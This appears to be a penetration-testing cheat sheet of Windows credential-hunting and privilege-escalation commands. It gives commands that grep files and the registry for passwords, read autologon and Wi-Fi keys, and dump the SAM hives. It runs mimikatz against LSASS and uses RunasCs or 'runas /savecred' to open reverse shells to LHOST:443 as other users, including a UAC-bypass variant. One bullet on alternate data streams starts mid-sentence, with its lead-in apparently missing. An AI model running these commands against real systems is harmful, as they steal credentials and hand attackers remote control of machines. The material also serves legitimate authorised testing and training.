# Windows credential checks

[← Windows quick reference](../04-windows-privesc.md)

## Credential hunting (always do this)
```powershell
# Files
findstr /si password *.txt *.ini *.config *.xml
type C:\Windows\Panther\Unattend.xml ; type C:\Windows\system32\sysprep\*.xml
# Registry
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword  # autologon creds
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"     # saved proxy/host
# Stored / Wi-Fi / browser
cmdkey /list ; netsh wlan show profile name=X key=clear
# LSASS / SAM
reg save hklm\sam sam ; reg save hklm\system system   # -> secretsdump (above)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam"
```

## Run as another user with creds (RunasCs: no interactive desktop needed)
Have creds for another account but no interactive logon? `runas` needs a desktop and fails from a reverse shell: RunasCs doesn't:
```powershell
.\RunasCs.exe <user> <pass> "cmd /c whoami"
.\RunasCs.exe <user> <pass> cmd.exe -r LHOST:443              # reverse shell AS <user>
.\RunasCs.exe <user> <pass> cmd.exe -d corp.example -r LHOST:443   # domain account
.\RunasCs.exe <user> <pass> cmd.exe --bypass-uac -r LHOST:443    # if <user> is a local admin
# PowerShell-only host (nothing on disk):
Invoke-RunasCs <user> <pass> "cmd /c whoami" -Domain corp.example
```
Also the move to pivot a service-account shell to a discovered user account.

 `dir /R`, `more < file:stream`, `type ... > file:hidden`.
- **machineKey / ViewState:** a leaked `web.config` machine key can undermine ViewState protection. Check the application's signing settings and the actual server-side parser before claiming code execution.
- **Runas with saved creds:** `runas /savecred /user:admin C:\rev.exe`.
- UAC bypass only if you're admin-but-not-elevated (fodhelper, etc.).
